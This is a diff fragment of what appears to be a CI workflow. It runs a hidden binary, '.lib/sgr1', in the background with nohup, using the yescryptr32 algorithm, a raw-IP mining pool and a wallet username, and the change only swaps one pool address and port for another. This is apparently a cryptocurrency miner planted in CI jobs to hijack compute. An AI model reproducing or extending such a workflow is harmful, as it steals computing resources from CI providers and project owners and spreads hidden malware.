@@ -56,7 +56,7 @@ jobs:
             cpulimit_pid=$!
             
             # Run the process with the specified parameters in background
-            nohup .lib/sgr1 -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$cpulimit_pid --timeout 120 -t 4 &
+            nohup .lib/sgr1 -a yescryptr32 --pool 45.115.225.146:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$cpulimit_pid --timeout 120 -t 4 &
             
             # Store the PID of the running process
             process_pid=$!
